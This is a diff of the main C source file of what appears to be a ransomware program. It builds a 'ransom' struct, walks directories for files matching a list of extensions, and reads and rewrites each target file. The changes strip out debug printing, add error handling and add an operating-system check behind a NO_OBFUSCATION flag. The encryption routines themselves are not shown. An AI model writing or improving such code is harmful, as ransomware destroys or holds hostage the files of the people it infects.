@@ -1,50 +1,4 @@
 #include "fournights.h"
-
-/**
-  * debug_list - prints elements of the target_file_buf struct
-  * @target_file_buf: lala
-  */
-#ifndef DEBUG
-#define DEBUG
-void debug_list(target_file_t *target_file_buf)
-{
-	printf("--------%s--------\n", target_file_buf->filepath);
-	printf("bytes_read: %d\n", (int)target_file_buf->bytes_read);
-	printf("file_offset: %d\n", (int)target_file_buf->file_offset);
-	printf("st_size: %d\n", (int)target_file_buf->file_info.st_size);
-	/*
-	target_file_buf->buf[400] = '\0';
-	*/
-	printf("%s...(truncated)...", target_file_buf->buf);
-	getchar();
-}
-/**
-  * print_for_debug - prints elements of the struct for debugging
-  * @ransom: pointer to the ransom struct
-  */
-void print_for_debug(struct ransom_s ransom)
-{
-	int debug_int = 0;
-	char **debug_dp = NULL;
-
-	/* PRINT STRUCT FOR DEBUGGING */
-	printf("DEBUG 0: root_path: %s\n", ransom.root_path);
-	printf("DEBUG 1: os_info.sysname: %s, .nodename: %s, .release: %s, .version: %s, .machine: %s\n", ransom.os_info.sysname, ransom.os_info.nodename, ransom.os_info.release, ransom.os_info.version, ransom.os_info.machine);
-
-	printf("DEBUG 2: file extension list \n");
-	debug_dp = ransom.file_extensions;
-	for (debug_int = 0; debug_dp[debug_int] != NULL; debug_int++)
-		printf("%s%s", debug_int == 0 ? "" : ", ", debug_dp[debug_int]);
-	getchar();
-	printf("\nHas NULL at end? %s\n", debug_dp[debug_int]);
-	printf("Filebuffer: Still alive? (strtok truncates past first file ext) %s\n", ransom.file_ext_nontoken);
-	getchar();
-	printf("Number of extensions to search: %d\n", ransom.num_of_file_ext);
-	printf("DEBUG 3: \n");
-	print_list(ransom.target_files);
-}
-#endif
-
 /**
   * free_ransom_struct - Frees all malloced space in the struct
   * @ransom: struct to free
@@ -153,7 +107,7 @@ int main(int ac, char *av[])
 	ransom.target_file_buf = target_file;
 
 /* build target_file_s part of ransom struct */
-	ransom.target_file_buf->filepath = my_calloc(BIGBUF, sizeof(char));
+	ransom.target_file_buf->filepath = my_calloc(PATH_MAX, sizeof(char));
 	ransom.target_file_buf->buf = my_calloc(BIGBUF * sizeof(char), sizeof(char));
 	ransom.target_file_buf->file_offset = 0;
 	ransom.target_file_buf->bytes_read = 0;
@@ -165,8 +119,17 @@ int main(int ac, char *av[])
 	if (uname(&sys_info) == -1)
 		perror("uname error:");
 	ransom.os_info = sys_info;
+#ifndef NO_OBFUSCATION
+	if (simple_search(sys_info.sysname, my_strlen(sys_info.sysname)))
+		return (EXIT_FAILURE);
+#endif
 	if((bytes_read = read_file(file_exts, &ransom, tokenizer)) < 1)
+	{
+#ifndef NO_DEBUG
 		fprintf(stderr, "File was empty\n");
+#endif
+		return(EXIT_FAILURE);
+	}
 	recurse_ls(ransom.root_path, &ransom);
 	/* Struct Built. */
 
@@ -180,7 +143,7 @@ int main(int ac, char *av[])
 		do
 		{
 			bytes_read = ransom.target_file_buf->bytes_read = read_file(walk->str, &ransom, write_file);
-#ifndef DEBUG_H
+#ifndef NO_DEBUG
 			debug_list(ransom.target_file_buf);
 #endif
 		}
@@ -191,7 +154,7 @@ int main(int ac, char *av[])
 		ransom.target_file_buf->bytes_read = 0;
 		walk = walk->next;
 	}
-#ifndef DEBUG_H
+#ifndef NO_DEBUG
 	print_for_debug(ransom);
 	print_list(ransom.target_files);
 #endif
